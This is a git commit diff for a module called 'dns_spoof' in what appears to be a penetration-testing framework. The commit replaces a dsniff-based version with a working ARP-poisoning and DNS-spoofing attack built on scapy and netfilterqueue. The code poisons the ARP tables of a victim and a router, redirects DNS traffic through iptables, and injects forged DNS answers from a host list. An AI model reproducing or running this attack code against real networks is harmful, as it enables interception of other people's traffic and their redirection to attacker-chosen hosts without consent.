79d0eda6da7c4b83525e8412790e200125c3ab34
4shadoww <4shadoww0@gmail.com>
2016-12-29 19:51:09 +0200

    updated

--- modules/dns_spoof.py
+++ modules/dns_spoof.py
@@ -4,62 +4,183 @@ from core.hakkuframework import *
 from core.anim import *
 from core import colors
 import os
-import time
 from core import getpath
+from netfilterqueue import NetfilterQueue
+from scapy.all import *
+import threading, queue
+import time
 
 conf = {
 	"name": "dns_spoof",
-	"version": "1.0",
+	"version": "2.0",
 	"shortdesc": "dns spoof",
 	"author": "4shadoww",
 	"github": "4shadoww",
 	"email": "4shadoww0@gmail.com",
 	"initdate": "29.4.2016",
 	"lastmod": "29.12.2016",
-	"apisupport": True,
+	"apisupport": False,
 	"needroot": 1,
-	"dependencies": ["xterm", "dsniff"]
 }
 
 
 # List of the variables
 variables = OrderedDict((
-	('interface', ['eth0', 'target interface']),
-	('target', ['192.168.1.2', 'target address']),
+	('victim', ['192.168.1.2', 'target address']),
 	('router', ['192.168.1.1', 'router address']),
+	("arp_spoof", ["true", "arp spoof [true/false]"])
 ))
 
-# Additional help notes
-help_notes = colors.red+"this module will not work without dsniff!"+colors.end
-
 # Additional notes to options
-option_notes = colors.red+'remember to edit hostslist:\n'+getpath.conf()+"hosts"+colors.end
+option_notes = colors.red+'remember to edit hostlist:\n'+getpath.conf()+"hosts"+colors.end
 
 customcommands = {
-	'stop': 'end dnsspoof'
+	'stop': 'end dns spoof'
 }
 
 #simple changelog
-changelog = "Version 1.0:\nrelease"
+changelog = "Version 1.0:\nrelease\nVersion 2.0:\n dsniff replaced with scapy and netfilterqueue"
+
+class Controller:
+	kill = False
+	error = None
+
+	def __init__(self):
+		self.kill = False
+		self.error = None
+
+	def reset(self):
+		self.kill = False
+		self.error = None
+
+class ArpSpoofer(threading.Thread):
+	router = None
+	victim = None
+	controller = None
+
+	def __init__(self, router, victim, controller):
+		self.router = router
+		self.victim = victim
+		self.controller = controller
+		threading.Thread.__init__(self)
+
+	def originalMAC(self, ip):
+		ans, unans = arping(ip, verbose=0)
+		for s,r in ans:
+			return r[Ether].src
+
+	def poison(self, routerIP, victimIP, routerMAC, victimMAC):
+		send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC), verbose=0)
+		send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC), verbose=0)
+
+	def restore(self, routerIP, victimIP, routerMAC, victimMAC):
+		send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=3, verbose=0)
+		send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=3, verbose=0)
+
+	def run(self):
+		tried = 0
+		routerMAC = self.originalMAC(self.router)
+		victimMAC = self.originalMAC(self.victim)
+		if routerMAC == None:
+			printError("could not find router MAC address")
+			if tried < 5:
+				printInfo("trying again...")
+				tried =+ 1
+				self.run()
+			printInfo("giving up...")
+			self.controller.error = "[err] could not find router MAC address"
+			self.controller.kill = True
+		if victimMAC == None:
+			printError("could not find victim MAC address")
+			if tried < 5:
+				printInfo("trying again...")
+				tried =+ 1
+				self.run()
+			printInfo("giving up...")
+			self.controller.error = "[err] could not find victim MAC address"
+			self.controller.kill = True
+
+		while 1:
+			if self.controller.kill == True:
+				self.restore(self.router, self.victim, routerMAC, victimMAC)
+				os.system('echo "0" >> /proc/sys/net/ipv4/ip_forward')
+				printInfo("arp spoofing ended [hit enter]", start="\n")
+				return
+			self.poison(self.router, self.victim, routerMAC, victimMAC)
+			time.sleep(1.5)
+
+
+def callback(packet):
+	found = False
+	payload = packet.get_payload()
+	pkt = IP(payload)
+	
+	if not pkt.haslayer(DNSQR):
+		packet.accept()
+	else:
+		for record in hostlist:
+			if record[1] in pkt[DNS].qd.qname:
+				printInfo(record[1].decode()+" -> "+record[0].decode())
+				found = True
+				spoofed_pkt = bytes(IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
+					UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
+					DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
+					an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=record[0])))
+
+				packet.set_payload(spoofed_pkt)
+				packet.accept()
+				break
+		if found == False:
+			packet.accept()
+
+controller = Controller()
+hostlist = []
 
 def run():
-	hostslist = getpath.conf()+"hosts"
-	animInfo("status: ipv4 forwarding...")
-	os.system('echo "1" >> /proc/sys/net/ipv4/ip_forward')
-	animInfo("status: starting arp spoof...")
-	xterm1 = "xterm -e arpspoof -i "+ variables['interface'][0]+ " -t "+ variables['target'][0]+ " "+ variables['router'][0] + " &"
-	xterm2 = "xterm -e arpspoof -i "+ variables['interface'][0]+ " -t "+ variables['router'][0]+ " "+ variables['target'][0] + " &"
-	os.system(xterm1)
-	os.system(xterm2)
-	animInfo("status: waiting for arp spoof...")
-	time.sleep(5)
-	animInfo("status: starting dns spoof...", last=True)
-	xterm3 = "xterm -e dnsspoof -i "+ variables['interface'][0]+ " -f "+ hostslist + " host " + variables['target'][0]+ " &"
-	os.system(xterm3)
-	printInfo('use "stop" command to end')
-	return "[suf]"
+	controller.reset()
+	printInfo("loading host list...")
+	try:
+		hostfile = open(getpath.conf()+"hosts", "r").read()
+	except FileNotFoundError:
+		printError("host list not found")
+		return
+	except PermissionError:
+		printError("permission denied")
+	for line in hostfile.splitlines():
+		if "#" not in line and len(line.split()) == 2:
+			hostlist.append(line.split())
 
-def stop(args):
-	os.system("killall arpspoof")
-	os.system("killall dnsspoof")
-	return "[suf]"
+	for item in hostlist:
+		item[0] = item[0].encode()
+		item[1] = item[1].encode()
+
+	#print(hostlist)
+	#return
+
+	if variables["arp_spoof"][0] == "true":
+		printInfo("ipv4 forwarding...")
+		os.system('echo "1" >> /proc/sys/net/ipv4/ip_forward')
+		printInfo("starting arp spoof...")
+		arpspoof = ArpSpoofer(variables["router"][0], variables["victim"][0], controller)
+		arpspoof.start()
+
+	printInfo("ctrl + c to end")
+	os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')
+	try:
+		q = NetfilterQueue()
+		q.bind(1, callback)
+		try:
+			q.run()
+		except KeyboardInterrupt:
+			controller.kill = True
+			q.unbind()
+			os.system('iptables -F')
+			os.system('iptables -X')
+			printInfo("dns spoof ended")
+	except:
+		printError("unexcepted error:\n")
+		traceback.print_exc(file=sys.stdout)
+		controller.kill = True
+
+	printInfo("dns spoof ended")
+	printInfo("stopping arp spoof")
